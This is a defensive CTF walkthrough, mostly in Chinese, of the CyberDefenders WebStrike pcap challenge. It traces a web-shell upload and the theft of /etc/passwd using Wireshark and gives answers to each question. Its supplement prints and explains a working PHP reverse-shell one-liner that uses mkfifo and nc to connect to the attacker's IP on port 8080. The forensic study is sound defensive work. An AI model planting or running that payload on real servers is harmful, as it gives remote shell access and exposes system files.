###### tags: `Cyber Defender` `Wireshark` `PCAP` `Exfiltration`

# Cyberdefenders WebStrike Walkthough
    Category: Network Forensics

題目來源：https://cyberdefenders.org/blueteam-ctf-challenges/webstrike/

## Details (詳情)

An anomaly was discovered within our company's intranet as our Development team found an unusual file on one of our web servers. Suspecting potential malicious activity, the network team has prepared a pcap file with critical network traffic for analysis for the security team, and you have been tasked with analyzing the pcap.

翻譯:

由於我們的開發團隊在其中一台 Web 伺服器上發現了異常文件，因此我們公司的Intranet中發現了異常情況。由於懷疑潛在的惡意活動，網路團隊準備了一個包含關鍵網路流量的pcap文件，供安全團隊進行分析，而您的任務是分析該pcap。

## Tools (工具)

- WireShark

---

## Question

### Q1. Understanding the geographical origin of the attack aids in geo-blocking measures and threat intelligence analysis. What city did the attack originate from?
==Ans:Tianjin==

:::info
Tip:
由於Detail中提到在Web Server中發現了異常文件，
所以可以優先從這個地方入手尋找攻擊者。
:::

1. 打開題目附的pcap檔案(使用Wireshark)，點擊Statistics -> Conversations -> IPv4，
可以看到只有兩個IP之間再傳輸，能肯定的只有攻擊者在其中而已。
![image](https://hackmd.io/_uploads/HkGmzEXs0.png)

2. 接著我們開始檢查在此封包有什麼樣的協議類型，
點擊Statistics -> Protocol Hierarchy，會發現到只有HTTP的流量。
![image](https://hackmd.io/_uploads/H1bAMNXjR.png)

3. 可以先用搜尋http的方式排除大部分我們不需要的封包
知道了117.11.88.124有取得24.49.63.79的網頁資源。
![image](https://hackmd.io/_uploads/BkkXZ2NsA.png)

4. 接下來我們開始思考攻擊者是如何攻擊的？
有可能是SQL Injection，也有可能是上傳Payload，有很多種攻擊web的方式。
(這邊只是舉個例思考可能有的攻擊方式，盡可能的縮小搜索範圍) 

5. 從Step 3繼續接著走，先試著定位117.11.88.124有沒有對該網域
做更多的事情(像是取得重要資料 or 上傳什麼可疑的東西)？
```
篩選器：
http && ip.src == 117.11.88.124 and ip.dst == 24.49.63.79
```
>調查後發現到說他有取得並上傳奇怪的檔案(取得admin和上傳php檔)。
>(紅框處為可疑的地方)
![螢幕擷取畫面 2024-08-22 204255](https://hackmd.io/_uploads/HyhoznNsC.png)

6. 先檢查上傳的檔案，第一個POST上傳失敗了(web server回傳失敗)
但是裡面同時涵蓋著payload，已經可以開始認定這就是攻擊者！
![螢幕擷取畫面 2024-08-22 204757](https://hackmd.io/_uploads/Bk6r4nNi0.png)
圖[1] : 失敗的payload封包
![螢幕擷取畫面 2024-08-22 205200](https://hackmd.io/_uploads/ByjqNhNjC.png)
圖[2] : 上傳成功的payload封包(第二個POST)

7. 將傳輸該內容的來源(Src)IP，丟至Whois上查詢(看要網路上的還怎樣都行)，
就會看到該IP的地點了。
![image](https://hackmd.io/_uploads/ryps6mP5A.png)

### Q2. Knowing the attacker's user-agent assists in creating robust filtering rules. What's the attacker's user agent?
==Ans:Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0==

1. 在上一題的解題過程中，我有展示TCP Stream 5的內容(也就是上傳upload的封包)，
封包裡面本身會詳細寫著該IP和受害者的資訊(像是內容長度、Host等)，其中也包含User-Agent。
![image](https://hackmd.io/_uploads/HJAfS2EiR.png)

### Q3. We need to identify if there were potential vulnerabilities exploited. What's the name of the malicious web shell uploaded?
==Ans:image.jpg.php==

1. 一樣根據Q1在封包的中間位置可以看到他Payload的FileName。
![螢幕擷取畫面 2024-08-22 205200](https://hackmd.io/_uploads/HkgcS2NjR.png)

### Q4. Knowing the directory where files uploaded are stored is important for reinforcing defenses against unauthorized access. Which directory is used by the website to store the uploaded files?
==Ans:/reviews/uploads/==

1. 持續追蹤攻擊者上傳的檔案，能找到攻擊者存放Payload的目錄位置
利用Display Fliter欄搜尋"ip.dst == 24.49.63.79 && http.request.method == GET"。
![螢幕擷取畫面 2024-08-22 210301](https://hackmd.io/_uploads/ByVVw2ViC.png)

### Q5. Identifying the port utilized by the web shell helps improve firewall configurations for blocking unauthorized outbound traffic. What port was used by the malicious web shell?
==Ans:8080==

1. 在Q1的Shell Code就有說明他攻擊的Port是8080
![image](https://hackmd.io/_uploads/S1-svhVoA.png)

### Q6. Understanding the value of compromised data assists in prioritizing incident response actions. What file was the attacker trying to exfiltrate?
==Ans:passwd==

1. 回到Q4的步驟，持續追蹤到受害者接收到該Webshell並開始運行的Stream，
在那個Stream中發現了攻擊者嘗試盜取的檔案，為etc\passwd。
(成功取得後使用curl指令回傳給自己的IP。)
![image](https://hackmd.io/_uploads/Sy1cd2VjC.png)
圖[1]：攻擊者取得etc/passwd的過程和內容
![image](https://hackmd.io/_uploads/ryjqOnEjR.png)
圖[2]：攻擊者使用curl指令回傳給自己IP的過程。

:::success
/etc/passwd 檔案是以冒號區隔的檔案，其包含下列資訊：
- 使用者名稱
- 加密的密碼
- 使用者的UID
- 使用者所在的GID
- 使用者登入後的起始目錄
- 登入後shell開始的路徑

參考資料：https://hackmd.io/@ncnu-opensource/ry8-hpefi
:::

---

## 額外補充

### WireShark - Convesations
Converation這個功能裡面詳細記錄了每個IP之間的封包傳遞數，IPv4、v6位置以及封包大小。

### WireShark - Protocol Hierarchy
這個功能可以顯示所有封包使用的協議。每行都包含一個協議的統計值(像是封包占比、數量等)。

### Whois
WHOIS是用來查詢Internet中域名(Domain Name)的IP以及IP所有者等資訊的傳輸協定。
包含發行商，註冊者名稱、地區、國家等資訊都會標註。

### Payload
```php=
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>
```
該指令通過在目標機器上設置一個reverse shell，
使攻擊者能夠在自己的IP位置以指定的Port 8080接收並開啟受害者的terminal，從而實現遠端控制。

分解成區段的話長這樣：
1. `rm /tmp/f`;：刪除位於 /tmp/ 目錄下名為 f 的檔案。
2. `mkfifo /tmp/f`;：創建一個名為'f'的管道（FIFO），它是一種特殊的檔案，允許雙向通信。
3. `cat /tmp/f`：讀取'f'管道中的數據。
4. `/bin/sh -i`：啟動一個交互式的 'sh' shell。
5. `2>&1`：將stderr重定向到stdout(以便將所有內容都保存在一個檔案中)。
6. `nc 117.11.88.124 8080`：使用nc連接到IP 117.11.88.124 上的8080 port。
7. `>/tmp/f`：將nc連接的輸出寫到'f'管道中，形成一個雙向通信的reverse shell。
